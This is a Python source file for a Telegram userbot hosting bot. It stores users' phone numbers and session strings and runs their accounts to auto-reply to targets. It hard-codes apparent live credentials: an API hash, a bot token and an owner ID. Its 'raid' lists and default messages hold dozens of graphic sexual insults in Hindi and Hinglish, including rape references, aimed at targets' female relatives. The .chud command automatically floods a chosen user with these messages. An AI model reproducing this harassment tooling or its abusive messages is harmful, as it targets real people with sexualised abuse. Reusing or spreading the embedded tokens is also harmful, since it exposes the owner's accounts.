#!/usr/bin/env python3
# =====================================================================
# TELEGRAM AUTO TAGGER USERBOT HOSTER — FINAL COMPLETE VERSION (STABLE)
# =====================================================================

import asyncio
import logging
import os
import re
import random
import sqlite3
import json
import sys
import tempfile
from typing import Optional, Dict, Any, List, Tuple
from datetime import datetime
from collections import defaultdict, deque
import time

from dotenv import load_dotenv
from telethon import TelegramClient, events, types, functions, Button
from telethon.sessions import StringSession
from telethon.errors import (
    RPCError, FloodWaitError, PhoneNumberInvalidError,
    SessionPasswordNeededError, TimeoutError as TelethonTimeout,
    AuthKeyUnregisteredError, UserIsBlockedError, UserNotParticipantError,
    ChannelPrivateError, ChannelInvalidError, ChatSendMediaForbiddenError,
    SecurityError, UnauthorizedError
)
from telethon.tl.types import (
    MessageEntityBlockquote, MessageEntityCustomEmoji, PeerUser,
    InputPeerChannel, InputChannel
)
from telethon.tl.functions.users import GetFullUserRequest
from telethon.tl.functions.channels import JoinChannelRequest, GetParticipantRequest
from telethon.network import ConnectionTcpFull

load_dotenv()

# =====================================================================
# CONFIGURATION
# =====================================================================
API_ID = int(os.getenv("API_ID", 37379664))
API_HASH = os.getenv("API_HASH", "ddcd7db1620a8c5ff9cdebd5f5c44107")
BOT_TOKEN = os.getenv("BOT_TOKEN", "8612619822:AAFIuv-VfEQCA8bxnokj6w_7tAeRMK-vee0")
OWNER_ID = int(os.getenv("OWNER_ID", 5703874798))

REQUIRED_CHANNEL = "@RANDKINGGG"

SESSION_DIR = "sessions"
AUTH_TIMEOUT = 120
MAX_RESTART_ATTEMPTS = 30  # increased for better resilience
DB_PATH = "hoster.db"
START_IMAGE = "https://graph.org/file/38c834e6dba14cd2d1b63-2f078bc613e0c7639d.jpg"
BROADCAST_IMAGE = "https://graph.org/file/e0f4cb871628b6af12f20-95aa068f918d760b2f.jpg"

READ_TIMEOUT = 60

if not API_ID or not API_HASH or not BOT_TOKEN:
    print("❌ ERROR: API_ID, API_HASH, and BOT_TOKEN must be set")
    sys.exit(1)

# =====================================================================
# LOGGING
# =====================================================================
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s | %(levelname)s | %(message)s"
)
logger = logging.getLogger("UserbotHoster")
logger.setLevel(logging.INFO)

logging.getLogger("telethon").setLevel(logging.WARNING)
logging.getLogger("asyncio").setLevel(logging.WARNING)

# =====================================================================
# FONTS (unchanged)
# =====================================================================
FONTS = {
    "castle": {
        'a': '𝗔', 'b': 'ß', 'c': 'c͠', 'd': 'ɗ', 'e': 'ɘ', 'f': 'Ғ', 'g': '𝗴', 'h': 'ɧ',
        'i': 'i͠', 'j': 'ʝ', 'k': 'ƙ', 'l': 'ɭ', 'm': 'ɱ', 'n': 'ɳ', 'o': '❍', 'p': 'p᩶',
        'q': '𝐐', 'r': 'r᩶', 's': '𝐬', 't': '𝗧', 'u': '𝘂', 'v': 'v̸', 'w': 'Ꮗ', 'x': 'x̥ͦ',
        'y': 'ɣ', 'z': 'ʑ'
    },
    "outline": {
        'a': '𝔸𝔸', 'b': '𝔹𝔹', 'c': 'ℂℂ', 'd': '𝔻𝔻', 'e': '𝔼𝔼', 'f': '𝔽𝔽', 'g': '𝔾𝔾', 'h': 'ℍℍ',
        'i': '𝕀𝕀', 'j': '𝕁𝕁', 'k': '𝕂𝕂', 'l': '𝕃𝕃', 'm': '𝕄𝕄', 'n': 'ℕℕ', 'o': '𝕆𝕆', 'p': 'ℙℙ',
        'q': 'ℚℚ', 'r': 'ℝℝ', 's': '𝕊𝕊', 't': '𝕋𝕋', 'u': '𝕌𝕌', 'v': '𝕍𝕍', 'w': '𝕎𝕎', 'x': '𝕏𝕏',
        'y': '𝕐𝕐', 'z': 'ℤℤ'
    },
    "chapra": {
        'a': 'AAAAAA👿', 'b': 'BBBBB🤍', 'c': 'CCCCCC⚔️', 'd': 'DDDDD👿', 'e': 'EEEEEE💊',
        'f': 'FFFFFF🔥', 'g': 'GGGGGG🖤', 'h': 'HHHHH🖤', 'i': 'IIIIII🍷', 'j': 'JJJJJJ👅',
        'k': 'KKKKKK💜', 'l': 'LLLLLL🔨', 'm': 'MMMMM🚀', 'n': 'NNNNNN🤣', 'o': 'OOOOO🎲',
        'p': 'PPPPPP📌', 'q': 'QQQ', 'r': 'RRRRR🔘', 's': 'SSSSS⚒️', 't': 'TTTTT🚭',
        'u': 'UUUUU💣', 'v': 'VVVV', 'w': 'WWWWW🥰', 'x': 'XXXXX👰', 'y': 'YYYYYY', 'z': 'ZZZZZ🎀'
    },
    "sans": {
        'a': '𝗔𝗔', 'b': '𝗕𝗕', 'c': '𝗖𝗖', 'd': '𝗗𝗗𝗗', 'e': '𝗘𝗘', 'f': '𝗙𝗙', 'g': '𝗚𝗚', 'h': '𝗛𝗛',
        'i': '𝗜𝗜', 'j': '𝗝𝗝', 'k': '𝗞𝗞', 'l': '𝗟𝗟', 'm': '𝗠𝗠', 'n': '𝗡𝗡', 'o': '𝗢𝗢', 'p': '𝗣𝗣',
        'q': '𝗤𝗤', 'r': '𝗥𝗥', 's': '𝗦𝗦', 't': '𝗧𝗧', 'u': '𝗨𝗨', 'v': '𝗩𝗩', 'w': '𝗪𝗪', 'x': '𝗫𝗫',
        'y': '𝗬𝗬', 'z': '𝗭𝗭'
    },
    "serif": {
        'a': '❹', 'b': '❽', 'c': '🅲', 'd': '🅳', 'e': '❸', 'f': '🅵', 'g': '❾', 'h': '🅷',
        'i': '🅸', 'j': '🅹', 'k': '🅺', 'l': '❶', 'm': '🅼', 'n': '🅽', 'o': '⓿', 'p': '🅿',
        'q': '🆀', 'r': '🆁', 's': '❺', 't': '❼', 'u': '🆄', 'v': '🆅', 'w': '🆆', 'x': '🆇',
        'y': '🆈', 'z': '❷'
    },
    "math": {
        'a': '44', 'b': '88', 'c': '((', 'd': 'DD', 'e': '33', 'f': 'FF', 'g': '99', 'h': 'HH',
        'i': '!!', 'j': 'JJ', 'k': 'KK', 'l': '11', 'm': 'MM', 'n': 'NN', 'o': '00', 'p': 'PP',
        'q': 'QQ', 'r': 'RR', 's': '55', 't': '77', 'u': 'UU', 'v': 'VV', 'w': 'WW', 'x': 'XX',
        'y': 'YY', 'z': 'ZZ'
    },
    "freeze": {
        'a': '❄A', 'b': '❄B', 'c': '❄C', 'd': '❄D', 'e': '❄E', 'f': '❄F', 'g': '❄G', 'h': '❄H',
        'i': '❄I', 'j': '❄J', 'k': '❄K', 'l': '❄L', 'm': '❄M', 'n': '❄N', 'o': '❄O', 'p': '❄P',
        'q': '❄Q', 'r': '❄R', 's': '❄S', 't': '❄T', 'u': '❄U', 'v': '❄V', 'w': '❄W', 'x': '❄X',
        'y': '❄Y', 'z': '❄Z'
    },
    "heart": {
        'a': '❤A', 'b': '❤B', 'c': '❤C', 'd': '❤D', 'e': '❤E', 'f': '❤F', 'g': '❤G', 'h': '❤H',
        'i': '❤I', 'j': '❤J', 'k': '❤K', 'l': '❤L', 'm': '❤M', 'n': '❤N', 'o': '❤O', 'p': '❤P',
        'q': '❤Q', 'r': '❤R', 's': '❤S', 't': '❤T', 'u': '❤U', 'v': '❤V', 'w': '❤W', 'x': '❤X',
        'y': '❤Y', 'z': '❤Z'
    },
    "suzo": {
        'a': '➾A', 'b': '➾B', 'c': '➾C', 'd': '➾D', 'e': '➾E', 'f': '➾F', 'g': '➾G', 'h': '➾H',
        'i': '➾I', 'j': '➾J', 'k': '➾K', 'l': '➾L', 'm': '➾M', 'n': '➾N', 'o': '➾O', 'p': '➾P',
        'q': '➾Q', 'r': '➾R', 's': '➾S', 't': '➾T', 'u': '➾U', 'v': '➾V', 'w': '➾W', 'x': '➾X',
        'y': '➾Y', 'z': '➾Z'
    },
    "tiger": {
        'a': '𓄂️A', 'b': '𓄂️B', 'c': '𓄂️C', 'd': '𓄂️D', 'e': '𓄂️E', 'f': '𓄂️F', 'g': '𓄂️G', 'h': '𓄂️H',
        'i': '𓄂️I', 'j': '𓄂️J', 'k': '𓄂️K', 'l': '𓄂️L', 'm': '𓄂️M', 'n': '𓄂️N', 'o': '𓄂️O', 'p': '𓄂️P',
        'q': '𓄂️Q', 'r': '𓄂️R', 's': '𓄂️S', 't': '𓄂️T', 'u': '𓄂️U', 'v': '𓄂️V', 'w': '𓄂️W', 'x': '𓄂️X',
        'y': '𓄂️Y', 'z': '𓄂️Z'
    },
    "double": {
        'a': 'AA', 'b': 'BB', 'c': 'CC', 'd': 'DD', 'e': 'EE', 'f': 'FF', 'g': 'GG', 'h': 'HH',
        'i': 'II', 'j': 'JJ', 'k': 'KK', 'l': 'LL', 'm': 'MM', 'n': 'NN', 'o': 'OO', 'p': 'PP',
        'q': 'QQ', 'r': 'RR', 's': 'SS', 't': 'TT', 'u': 'UU', 'v': 'VV', 'w': 'WW', 'x': 'XX',
        'y': 'YY', 'z': 'ZZ'
    },
    "wings": {
        'a': 'A࿐', 'b': 'B࿐', 'c': 'C࿐', 'd': 'D࿐', 'e': 'E࿐', 'f': 'F࿐', 'g': 'G࿐', 'h': 'H࿐',
        'i': 'I࿐', 'j': 'J࿐', 'k': 'K࿐', 'l': 'L࿐', 'm': 'M࿐', 'n': 'N࿐', 'o': 'O࿐', 'p': 'P࿐',
        'q': 'Q࿐', 'r': 'R࿐', 's': 'S࿐', 't': 'T࿐', 'u': 'U࿐', 'v': 'V࿐', 'w': 'W࿐', 'x': 'X࿐',
        'y': 'Y࿐', 'z': 'Z࿐'
    }
}

def apply_font(text: str, font_name: str) -> str:
    if not text or not font_name or font_name.lower() == "off":
        return text
    mapping = FONTS.get(font_name.lower())
    if not mapping:
        return text
    return ''.join(mapping.get(ch.lower(), ch) for ch in text)

# =====================================================================
# UTILITIES (unchanged)
# =====================================================================
def utf16_length(text):
    return len(text.encode("utf-16-le")) // 2 if text else 0

def quote_entities(text):
    if not text:
        return []
    try:
        return [MessageEntityBlockquote(offset=0, length=utf16_length(text), collapsed=False)]
    except TypeError:
        try:
            return [MessageEntityBlockquote(offset=0, length=utf16_length(text))]
        except:
            return []

def get_message_sender_id(message):
    if not message:
        return None
    sender_id = getattr(message, "sender_id", None)
    if sender_id is not None:
        return sender_id
    from_id = getattr(message, "from_id", None)
    if isinstance(from_id, PeerUser):
        return from_id.user_id
    return None

def normalize_chat_id(chat_id):
    if chat_id is None:
        return None
    try:
        chat_id = int(chat_id)
    except:
        return None
    if chat_id < 0:
        return chat_id
    return int("-100" + str(chat_id))

def chat_matches_tracker(chat_id, tracker_chat_id):
    if not tracker_chat_id or chat_id is None:
        return False
    try:
        tracker_chat_id = int(tracker_chat_id)
        chat_id = int(chat_id)
    except:
        return False
    if chat_id == tracker_chat_id:
        return True
    normalized = normalize_chat_id(chat_id)
    if normalized == tracker_chat_id or normalize_chat_id(tracker_chat_id) == chat_id or normalize_chat_id(tracker_chat_id) == normalized:
        return True
    return False

def mask_phone(phone):
    if len(phone) <= 8:
        return phone
    return phone[:4] + "••••••" + phone[-4:]

def mask_session(session_string):
    if len(session_string) <= 20:
        return session_string[:5] + "••••••••••" + session_string[-5:] if len(session_string) > 10 else session_string
    return session_string[:10] + "••••••••••" + session_string[-10:]

def normalize_phone(phone: str) -> str:
    phone = phone.strip()
    phone = re.sub(r"[^\d+]", "", phone)
    if phone.startswith("+"):
        return phone
    if phone.startswith("00"):
        return "+" + phone[2:]
    return "+" + phone

# =====================================================================
# QUOTE REPLY HELPERS (unchanged)
# =====================================================================
async def reply_quote(event, text, reply_to=None):
    try:
        entities = quote_entities(text)
        if entities:
            return await event.reply(text, formatting_entities=entities, reply_to=reply_to)
        else:
            return await event.reply(text, reply_to=reply_to, parse_mode='markdown')
    except Exception:
        return await event.reply(text, reply_to=reply_to)

async def edit_quote(event, text):
    try:
        entities = quote_entities(text)
        if entities:
            return await event.edit(text, formatting_entities=entities)
        else:
            return await event.edit(text, parse_mode='markdown')
    except Exception:
        return await event.edit(text)

# =====================================================================
# DATABASE (unchanged except we added is_active handling)
# =====================================================================
def get_db():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    with get_db() as conn:
        conn.execute("""
            CREATE TABLE IF NOT EXISTS hosted_accounts (
                user_id INTEGER PRIMARY KEY,
                phone TEXT NOT NULL,
                session_string TEXT NOT NULL,
                is_active INTEGER DEFAULT 1,
                settings TEXT DEFAULT '{}',
                created_at INTEGER DEFAULT (strftime('%s', 'now'))
            )
        """)
        conn.execute("""
            CREATE TABLE IF NOT EXISTS pending_auth (
                user_id INTEGER PRIMARY KEY,
                phone TEXT NOT NULL,
                temp_session_string TEXT,
                auth_data TEXT,
                created_at INTEGER DEFAULT (strftime('%s', 'now'))
            )
        """)
        conn.execute("""
            CREATE TABLE IF NOT EXISTS bot_users (
                user_id INTEGER PRIMARY KEY,
                started_at INTEGER DEFAULT (strftime('%s', 'now'))
            )
        """)
        conn.execute("""
            CREATE TABLE IF NOT EXISTS global_settings (
                key TEXT PRIMARY KEY,
                value TEXT
            )
        """)
        conn.commit()

def save_bot_user(user_id: int):
    with get_db() as conn:
        conn.execute("INSERT OR IGNORE INTO bot_users (user_id) VALUES (?)", (user_id,))
        conn.commit()

def get_all_bot_users() -> list:
    with get_db() as conn:
        rows = conn.execute("SELECT user_id FROM bot_users").fetchall()
        return [row["user_id"] for row in rows]

def save_hosted_account(user_id: int, phone: str, session_string: str, settings: dict = None):
    with get_db() as conn:
        conn.execute(
            "INSERT OR REPLACE INTO hosted_accounts (user_id, phone, session_string, settings, is_active) VALUES (?, ?, ?, ?, 1)",
            (user_id, phone, session_string, json.dumps(settings or {}))
        )
        conn.commit()

def get_hosted_account(user_id: int) -> Optional[Dict[str, Any]]:
    with get_db() as conn:
        row = conn.execute("SELECT * FROM hosted_accounts WHERE user_id = ?", (user_id,)).fetchone()
        return dict(row) if row else None

def get_all_hosted_accounts() -> list:
    with get_db() as conn:
        rows = conn.execute("SELECT * FROM hosted_accounts WHERE is_active = 1").fetchall()
        return [dict(row) for row in rows]

def set_account_inactive(user_id: int):
    with get_db() as conn:
        conn.execute("UPDATE hosted_accounts SET is_active = 0 WHERE user_id = ?", (user_id,))
        conn.commit()

def delete_hosted_account(user_id: int):
    with get_db() as conn:
        conn.execute("DELETE FROM hosted_accounts WHERE user_id = ?", (user_id,))
        conn.commit()

def set_pending_auth(user_id: int, phone: str, temp_session_string: str, auth_data: dict):
    with get_db() as conn:
        conn.execute(
            "INSERT OR REPLACE INTO pending_auth (user_id, phone, temp_session_string, auth_data) VALUES (?, ?, ?, ?)",
            (user_id, phone, temp_session_string, json.dumps(auth_data))
        )
        conn.commit()

def get_pending_auth(user_id: int) -> Optional[Dict[str, Any]]:
    with get_db() as conn:
        row = conn.execute("SELECT * FROM pending_auth WHERE user_id = ?", (user_id,)).fetchone()
        return dict(row) if row else None

def delete_pending_auth(user_id: int):
    with get_db() as conn:
        conn.execute("DELETE FROM pending_auth WHERE user_id = ?", (user_id,))
        conn.commit()

def clear_expired_pending_auth(timeout: int):
    with get_db() as conn:
        conn.execute(
            "DELETE FROM pending_auth WHERE (strftime('%s', 'now') - created_at) > ?",
            (timeout,)
        )
        conn.commit()

def get_global_setting(key: str) -> Optional[str]:
    with get_db() as conn:
        row = conn.execute("SELECT value FROM global_settings WHERE key = ?", (key,)).fetchone()
        return row["value"] if row else None

def set_global_setting(key: str, value: str):
    with get_db() as conn:
        conn.execute("INSERT OR REPLACE INTO global_settings (key, value) VALUES (?, ?)", (key, value))
        conn.commit()

def get_global_oneword_list() -> List[str]:
    val = get_global_setting("global_oneword_list")
    return json.loads(val) if val else []

def set_global_oneword_list(words: List[str]):
    set_global_setting("global_oneword_list", json.dumps(words))

# =====================================================================
# DEFAULT RAID MESSAGES (unchanged)
# =====================================================================
DEFAULT_RAID_MESSAGES = [
    "TERI MAA KEE CHUT ME LAUDA MAUR",
    "TERI BEHEN CHOD DENGA TERA YE BAAP",
    "MAA KEE LODE TERI MAA JINDA KAR",
    "TERI DIDI KE MUH MEH LAUDA MRU",
    "TERI BEHEN KE MUH MEH LAUDA MARU",
    "TERI MAAME BUA KE MUH MEH LAUDA MARU",
    "TERI DIDI KA BOSHDA NILAM KARDUNGA",
    "TERI DIDI KE CHUT DIKHA SBKO",
    "OYE TERI MAIYAA KA BOSHDA KA RAPE HOGYA",
    "OYE TERI DIDI KE CHUT MARDUNGA AAJ MAI",
    "TERI DIDI BEHEN KA BOSHDA UDA DUNGAA",
    "TERI MAIYA KE JHAATE BLAST KRDUNGA",
    "TERI BEHEN KE JHAATE BLAST KARDUNGA",
    "TERI BUA KE JHAATE BLAST KRDUNGA",
    "TERI BUDDHI NANI KE JHAATE BLAST KRDUNGA",
    "TERI MAA KI CHUT ME KABOTAR",
    "OYE TERI DIDI KE CHUT NILAM KARDUNGA AAJ",
    "TERI BEHEN KEE CHUT KO NILAM KRDU KYAA",
    "TERI DIDI KA BOSHDA DAFAN HOGYA KESE",
    "TERI BAHAN KE CHUT ME INJECTION LAGA DUNGA",
    "TERI MUMMY KE BOSHDE ME MUKKE MARU",
    "TERI BEHEN KO CHOD KAR USKO RNDI BANA DUNGA",
    "TERI MAA KO CHOD KAR USKO GB ROAD KI RNDI BANAUNGA",
    "TERI DIDI KE CHUT DIKHA SBKO",
    "TERA BAAP HU RNDI KE BACCHE MAI",
    "TERI MAAKI CHUT ME SPEED LAGA DUNGA",
    "TERI BEHEN KE CHUT ME FLASH KA LODA",
    "TERI DIDI KE GAND ME LODA CHALA KR MRUNGA",
    "TERI BEHEN KE BOSHDE KO FATAFAT CHODUNGA",
    "TERI MAA KE BOSHDE KO FATAFAT CHODUNGA",
    "TERI BUDDHI NANI KE BOSHDE KO FATAFAT CHODUNGA",
    "TERI BUA KE BOSHDE KI FATAFAT CHODUNGA",
    "TERI MAA KE GAND ME HAMMER BAJA DUNGA",
    "TERI BEHEN BETIYA KA BOSHDA KHATAM KRDUNGA",
    "TERI MAA KA PICHWADA DESTORY HOGYA",
    "TERI BEHEN KE CHUDAI DONE KRDI MENE",
    "TERI DIDI KE CHUT MAR KAR BHAG JAUNGA RNDIKE",
    "TERI MAIYA BETIYA KE SARR KO FAAD",
    "TERI DIDI KAA GAND JINDA KAR OYE MAAKE LODE",
    "TERI DIDI KAA GAND ME LUND KA BHANDAN LAGA DU",
    "TERI MAA KE BOSHDE ME UNGLI KRU",
    "TERI DIDI KE CHUT ME LAUDA MRDUNGA AAJ",
    "TERI MAA KE SARR PAR LAAT MARUNGA",
    "TERI BEHEN KE BOSHDE ME LODA ATTACK",
    "TERI DIDI KE CHUT ME LODA ATTACK MARDUNGA AAJ",
    "TERI BEHEN BETIYA CHOD DUNGA AAJ MAI RNDIKE"
]

# =====================================================================
# USERBOT INSTANCE (with fixes)
# =====================================================================
class UserbotInstance:
    def __init__(self, user_id: int, phone: str, session_string: str, settings: dict = None):
        self.user_id = user_id
        self.phone = phone
        self.session_string = session_string
        self.settings = settings or {}
        self.client = None
        self.task = None
        self.running = False
        self.restart_attempts = 0
        self._reconnect_lock = asyncio.Lock()
        self._handlers_registered = False
        self._watchdog_task = None  # for internal health checks

        self.trackers = []
        self.tracker_lock = asyncio.Lock()
        self.custom_name = None
        self.saved_messages_id = None

        self._processed_saved_msgs = set()

        self.ANTISPAM_ENABLED = self.settings.get("antispam_enabled", False)
        self.ANTISPAM_THRESHOLD = self.settings.get("antispam_threshold", 3)
        self.opponent_at_tracker = {}
        self.opponent_at_lock = asyncio.Lock()
        self.processed_opponent_messages = set()

        self.set_emoji_text = self.settings.get("set_emoji_text")
        self.set_emoji_document_id = self.settings.get("set_emoji_document_id")
        self.selected_font = self.settings.get("font")

        self.PING_PHOTO = "https://graph.org/file/608a25788d4f16cb4914b-07e32418d5e690ae8e.jpg"

        self.active_autoreply = set()
        self.custom_messages = {}
        self.reply_queues = defaultdict(deque)
        self.reply_index = defaultdict(int)
        self._processing_targets = set()
        self._load_chud_state()

        self.user_replyraid = self.settings.get("replyraid", {})
        self.user_custom_replyraid = self.settings.get("custom_replyraid", {})
        self.oneword_default = self.settings.get("oneword_default", [])
        self.oneword_active = False
        self.oneword_chat_id = None
        self.oneword_target_msg_id = None
        self.oneword_target_user_id = None
        self.oneword_words = []
        self.oneword_index = 0
        self.oneword_task = None
        self.oneword_delay = self.settings.get("oneword_delay", 1.0)
        self._oneword_update_attempts = 0

        self._save_settings()

    def _save_settings(self):
        self.settings.update({
            "replyraid": self.user_replyraid,
            "custom_replyraid": self.user_custom_replyraid,
            "oneword_default": self.oneword_default,
            "oneword_delay": self.oneword_delay,
            "antispam_enabled": self.ANTISPAM_ENABLED,
            "antispam_threshold": self.ANTISPAM_THRESHOLD,
            "set_emoji_text": self.set_emoji_text,
            "set_emoji_document_id": self.set_emoji_document_id,
            "font": self.selected_font,
        })
        self._save_chud_state()

    def _save_chud_state(self):
        self.settings["autoreply"] = [f"{c}:{u}" for (c, u) in self.active_autoreply]
        custom_dump = {}
        for (c, u), msgs in self.custom_messages.items():
            custom_dump[f"{c}:{u}"] = msgs
        self.settings["custom_messages"] = custom_dump
        save_hosted_account(self.user_id, self.phone, self.session_string, self.settings)

    def _load_chud_state(self):
        def load_set(key):
            raw = self.settings.get(key, [])
            s = set()
            for item in raw:
                try:
                    c, u = item.split(":")
                    s.add((int(c), int(u)))
                except:
                    continue
            return s
        self.active_autoreply = load_set("autoreply")
        custom_raw = self.settings.get("custom_messages", {})
        self.custom_messages = {}
        for key, msgs in custom_raw.items():
            try:
                c, u = key.split(":")
                self.custom_messages[(int(c), int(u))] = msgs
            except:
                continue
        self.reply_queues.clear()
        self.reply_index.clear()

    async def _resolve_user(self, event, arg: Optional[str]) -> Optional[int]:
        if event.is_reply:
            try:
                replied = await event.get_reply_message()
                if replied and replied.sender_id:
                    return replied.sender_id
            except:
                pass
        if arg:
            arg = arg.strip()
            link_match = re.search(r'(?:https?://)?t\.me/(?:c/(\d+)|([A-Za-z0-9_]+))/(\d+)', arg)
            if link_match:
                try:
                    result = await self.resolve_message_link(link_match.group(0))
                    if result:
                        entity, chat_id, message = result
                        sender_id = get_message_sender_id(message)
                        if sender_id:
                            return sender_id
                except:
                    pass
            try:
                if arg.startswith('@') or arg.isdigit():
                    entity = await self.client.get_entity(arg)
                    return entity.id
                else:
                    entity = await self.client.get_entity(arg)
                    return entity.id
            except:
                pass
        return None

    async def _get_target_id(self, event, arg=None, command_name="this command"):
        chat_id = event.chat_id
        if event.is_reply:
            try:
                user_id = (await event.get_reply_message()).sender_id
                return (chat_id, user_id)
            except Exception:
                await self.edit_quote(event, f"❌ Could not get replied user for `{command_name}`.")
                return None
        elif arg:
            try:
                user = await self.client.get_entity(arg)
                return (chat_id, user.id)
            except Exception:
                await self.edit_quote(event, f"❌ Invalid user ID or username.\nUsage: `{command_name} <reply/id/username>`")
                return None
        else:
            await self.edit_quote(event, f"❌ Missing target!\nUsage: `{command_name} <reply/id/username>`")
            return None

    def _default_messages(self):
        return [
            "👩🏿      👩🏻‍🦳        👵🏼         👱🏿‍♀️     \n👖      👖        👖         👖     \n\nतेरी बहन /तेरी माँ /तेरी दादि/ तेरीभुआ.\n\nसब की 𝐂hu𝐃𝐀i hogi",
            "तेरी माँ के（ ͜.人 ͜.）दबा दूंगा",
            "तेरी मा चुदी हुई थी\nचुदी हुई है\nऔर चुदी हुई रहेगी \n\n\"MARK MY WORD\" 😈",
            "𝐊ʏᴀ?\n𝐂ʏᴀ?\n𝐂ᴜᴀ?\n\n𝐌ᴛᴛ 𝐊ʀʀ 𝐓ᴇʀɪ 𝐌ᴀᴀ 𝐊ɪ 𝐂ʜᴜᴛ 𝐏ᴇ 𝐓ʜ𝐀ᴘᴘᴀᴅ 𝐌ᴀ𝐀ʀ 𝐃ᴜɴɢᴀ",
            "˚∧＿∧  　+        — ͟͞͞🥛\n(  •‿• )つ  — ͟͞͞ 🥛 \nSpecial attack tery mummy ke chuchiya ka dudu 🐱🎀",
            "Aaj Rakshabandhan Ke Avsar Pr तेरी मांँ मेरे लंड पर राखी Bandh Ke चुदेगी 😍🥰",
            "Sun दोस्त terko ye तीन चीजे कभी nahi भूलनी chaiye 😁👇🏻🤙🏿\n\n1 :- तेरी औकात\n2 :- तेरी बहन का फटा bhosda\n3 :- तेरी मां के भोसड़े में मेरा मूत",
            "Tery Maa Behen Ke Boshde Me Kya Maarun Jaldi Bata 😜🤙",
            "Tery Maa\nⓘ Verified Randy // 🦅🔥"
        ]

    # =====================================================================
    # CHUD (unchanged)
    # =====================================================================
    async def _chud_cmd(self, event):
        raw_arg = event.pattern_match.group(1) if event.pattern_match else ""
        if not raw_arg and not event.is_reply:
            await self.edit_quote(event, "❌ Provide a target: `.chud <reply/id/username/message_link> [text1,text2,...]`")
            return
        target = None
        texts_str = None
        link_match = re.search(r"(?:https?://)?t\.me/(?:c/(\d+)|([A-Za-z0-9_]+))/(\d+)", raw_arg)
        if link_match:
            link = link_match.group(0)
            rest = raw_arg[link_match.end():].strip()
            result = await self.resolve_message_link(link)
            if not result:
                await self.edit_quote(event, "❌ Invalid message link.")
                return
            entity, chat_id, message = result
            user_id = get_message_sender_id(message)
            if not user_id:
                await self.edit_quote(event, "❌ Could not determine target user from the message.")
                return
            target = (chat_id, user_id)
            texts_str = rest if rest else None
        else:
            if event.is_reply:
                target = await self._get_target_id(event, None, ".chud")
                texts_str = raw_arg
            else:
                parts = raw_arg.split(None, 1)
                first = parts[0]
                texts_str = parts[1] if len(parts) > 1 else None
                target = await self._get_target_id(event, first, ".chud")
            if not target:
                return
        if target[1] == self.user_id:
            await self.edit_quote(event, "❌ You cannot auto‑reply to yourself. Pick a different target.")
            return
        if texts_str:
            msgs = [t.strip() for t in texts_str.split(",") if t.strip()]
            if msgs:
                self.custom_messages[target] = msgs
                self._save_chud_state()
        self.active_autoreply.add(target)
        self._save_chud_state()
        used_msgs = self.custom_messages.get(target, self._default_messages())
        confirmation = (
            "╭─❖ ᴀᴜᴛᴏ-ʀᴇᴘʟʏ ᴇɴᴀʙʟᴇᴅ\n"
            "│\n"
            f"├─➤ ᴛᴀʀɢᴇᴛ : `{target[1]}`\n"
            f"├─➤ ᴄʜᴀᴛ : `{target[0]}`\n"
            f"├─➤ ᴍᴇssᴀɢᴇs : {len(used_msgs)}\n"
            "│\n"
            "╰─➤ ʀᴇᴘʟʏɪɴɢ ᴛᴏ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ɪɴ ᴛʜɪs ᴄʜᴀᴛ."
        )
        await self.edit_quote(event, confirmation)

    async def _soja_cmd(self, event):
        raw_arg = event.pattern_match.group(1) if event.pattern_match else ""
        if not raw_arg and not event.is_reply:
            await self.edit_quote(event,
                "╭─❖ ᴜsᴀɢᴇ ᴇʀʀᴏʀ\n"
                "│\n"
                "├─➤ .sᴏᴊᴀ <ʀᴇᴘʟʏ/ɪᴅ/ᴜsᴇʀɴᴀᴍᴇ/ᴍᴇssᴀɢᴇ_ʟɪɴᴋ>\n"
                "│\n"
                "╰─➤ ʀᴇᴘʟʏ ᴛᴏ ᴀ ᴛᴀʀɢᴇᴛ ᴍᴇssᴀɢᴇ, ᴏʀ ᴘʀᴏᴠɪᴅᴇ ᴀɴ ɪᴅ, ᴜsᴇʀɴᴀᴍᴇ, ᴏʀ ᴍᴇssᴀɢᴇ ʟɪɴᴋ."
            )
            return
        target = None
        link_match = re.search(r"(?:https?://)?t\.me/(?:c/(\d+)|([A-Za-z0-9_]+))/(\d+)", raw_arg)
        if link_match:
            link = link_match.group(0)
            rest = raw_arg[link_match.end():].strip()
            result = await self.resolve_message_link(link)
            if not result:
                await self.edit_quote(event, "❌ Invalid message link.")
                return
            entity, chat_id, message = result
            user_id = get_message_sender_id(message)
            if not user_id:
                await self.edit_quote(event, "❌ Could not determine target user from the message.")
                return
            target = (chat_id, user_id)
        else:
            if event.is_reply:
                target = await self._get_target_id(event, None, ".soja")
            else:
                target = await self._get_target_id(event, raw_arg, ".soja")
            if not target:
                return
        if target not in self.active_autoreply:
            await self.edit_quote(event, f"ℹ️ No active auto‑reply for target `{target[1]}` in this chat.")
            return
        self.active_autoreply.discard(target)
        self.reply_queues.pop(target, None)
        self.reply_index.pop(target, None)
        self._save_chud_state()
        confirmation = (
            "╭─❖ ᴀᴜᴛᴏ-ʀᴇᴘʟʏ ᴅɪsᴀʙʟᴇᴅ\n"
            "│\n"
            f"├─➤ ᴛᴀʀɢᴇᴛ : `{target[1]}`\n"
            f"├─➤ ᴄʜᴀᴛ : `{target[0]}`\n"
            "│\n"
            "╰─➤ ɴᴏ ᴍᴏʀᴇ ᴀᴜᴛᴏ ʀᴇᴘʟɪᴇs ᴛᴏ ᴛʜɪs ᴜsᴇʀ."
        )
        await self.edit_quote(event, confirmation)

    async def _resetchud_cmd(self, event):
        first = event.pattern_match.group(1) if event.pattern_match else None
        if event.is_reply:
            target = await self._get_target_id(event, None, ".resetchud")
        else:
            target = await self._get_target_id(event, first, ".resetchud")
        if not target:
            return
        self.custom_messages.pop(target, None)
        self._save_chud_state()
        await self.edit_quote(event, f"✅ Custom messages reset to default for {target[1]}.")

    async def _showchud_cmd(self, event):
        first = event.pattern_match.group(1) if event.pattern_match else None
        if event.is_reply:
            target = await self._get_target_id(event, None, ".showchud")
        else:
            target = await self._get_target_id(event, first, ".showchud")
        if not target:
            return
        msgs = self.custom_messages.get(target)
        if not msgs:
            await self.edit_quote(event, f"ℹ️ No custom messages for {target[1]}. Using default.")
            return
        text = "📝 **Custom messages:**\n\n" + "\n".join(f"{i+1}. {m}" for i, m in enumerate(msgs))
        await self.edit_quote(event, text)

    async def _chud_incoming_handler(self, event):
        sender_id = event.sender_id
        chat_id = event.chat_id
        if sender_id == self.user_id:
            return
        if (chat_id, sender_id) in self.active_autoreply:
            self.reply_queues[(chat_id, sender_id)].append(event)
